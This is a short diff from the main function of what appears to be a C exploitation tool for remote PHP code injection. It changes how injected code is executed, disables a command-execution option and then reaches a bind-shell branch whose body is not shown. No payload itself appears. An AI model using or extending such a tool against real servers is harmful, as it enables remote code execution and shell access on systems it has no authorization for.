@@ -475,12 +475,14 @@ int main(int argc, char **argv){
 
     if(xpl.code && xpl.vuln_uri && xpl.tech){
         xpl.cmdx = false;
-        exec_php(xpl);
+        exec_phpcode(xpl.vuln_uri, xpl.p_name, xpl.code, xpl.tech);
+
     }
 
     if(xpl.cmd && xpl.vuln_uri && xpl.tech){
-        xpl.cmdx = true;
-        exec_php(xpl);
+        printf("***-c disabled***\n");
+        /*xpl.cmdx = true;
+        exec_php(xpl);*/
     }
 
     if(options.bind_shell && options.ip_addr && options.port){
